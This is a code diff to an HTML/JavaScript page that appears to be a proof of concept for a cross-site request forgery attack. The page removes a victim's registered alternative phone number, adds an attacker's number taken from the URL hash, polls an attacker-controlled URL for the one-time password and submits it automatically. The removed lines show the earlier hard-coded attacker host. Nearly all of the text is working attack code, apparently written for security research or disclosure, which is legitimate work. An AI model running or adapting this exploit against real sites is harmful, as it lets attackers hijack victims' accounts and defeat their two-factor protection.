@@ -8,17 +8,20 @@
             var param = 'phone=&action=KSNS_ALTMOV_ACTION_BORRADO';
             get('delete number', param);
         }
-
+        var cron;
         function addNumber() {
             var num = document.getElementById('number').value;
             var param = 'phone='+num+'&checkbox-btns-sprite=on&altmovnew=0034'+num+'&action=KSNS_ALTMOV_ACTION_ALTA';
             get('add number', param);
+            log('Setting up '+ num + ' as alternative number for victim');
+            cron = setInterval(getOTP ,3000)
         }
 
         function sendOTP() {
             var otp = document.getElementById('otp').value;
             var param = 'idClave='+otp+'&otp='+otp+'&action=KSNS_ALTMOV_ACTION_OTP';
             get('send otp', param);
+            log('Phone successfully changed');
         }
 
         function get(msg, param) {
@@ -30,32 +33,46 @@
         }
 
 
+        var count = 0;
         function getOTP() {
+            count = count + 1;
+            if (count < 4) {
+                var url = "/pocs/mysecurity/otp.txt";
+                log('Fetching OTP from '+url);
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", url, true);
+                xhr.onload = function () {
+                    if (xhr.readyState == 4 && xhr.status == "200") {
+                        console.log("success: " + xhr.response.text);
+                        if (xhr.response.text.length > 4) {
+                            document.getElementById('otp').value = xhr.response.text;
+                            sendOTP();
+                        }
 
-            var url = "https://makensi.es/pocs/mysecurity/otp.txt";
-
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", url, true);
-            xhr.onload = function () {
-                if (xhr.readyState == 4 && xhr.status == "200") {
-                    console.log("success: " + xhr.response.text);
-                    if (xhr.response.text.length > 4) {
-                        document.getElementById('otp').value = xhr.response.text;
-                        sendOTP();
+                    } else {
+                        console.log("error");
+                        log('OTP still not available');
                     }
-
-                } else {
-                    console.log("error");
                 }
+                xhr.send();
+            } else {
+                log('OTP cannot be fetched, please enter OTP manually to complete de PoC');
+                clearInterval(cron);
+                document.getElementById('sendotpbtn').disabled = false;
+
             }
-            xhr.send();
+        }
+
+        function log(msg) {
+            const timeElapsed = Date.now();
+            const today = new Date(timeElapsed);
+            var p = document.createElement('p');
+            p.innerText = '['+ today.toUTCString() + '] ' + msg;
+            document.body.appendChild(p);
         }
 
 
-        // First, ensure a Cookies are set by doing a dummy request
-        get('dummy request', '');
 
-        setInterval(getOTP ,5000);
 
 
     </script>
@@ -66,10 +83,36 @@
 
 	    <h3>Now we add attacker's phone number (cannot be currently registered for other employee)</h3>
         <input type=text id="number">
-	    <button  type="button" onclick="addNumber()">Add phone number</button>
+	    <button id="numberbtn" type="button" onclick="addNumber()">Add phone number</button>
         
-	    <h3>Now we send the OTP (we could get this automatically via polling from attacker's side)</h3>
+	    <h3>Now we send the OTP (we try this automatically by polling attacker's side)</h3>
         <input type=text id="otp">
-	    <button  type="button" onclick="sendOTP()">Send OTP</button>
+	    <button disabled="true" id="sendotpbtn" type="button" onclick="sendOTP()">Send OTP</button>
+
+    <script>
+        var h3 = document.createElement('h2');
+        h3.innerText = 'Log';
+        document.body.appendChild(h3);
+        // First, ensure a Cookies are set by doing a dummy request
+        get('dummy request', '');
+        var number_added = false;
+        log('Doing a dummy request to refresh session cookies');
+
+        setTimeout(function() {
+                if (location.hash) {
+                    var numinput = document.getElementById('number');
+                    numinput.value = location.hash.split('#')[1];
+                    numinput.disabled = true;
+                    var numbtn = document.getElementById('numberbtn');
+                    numbtn.disabled = true;
+                    addNumber();
+                    
+                } else {
+
+                    log('You can put attackers phone number in location hash and reload');
+                }
+        }, 5000);
+
+    </script>
     </body>
 </html>
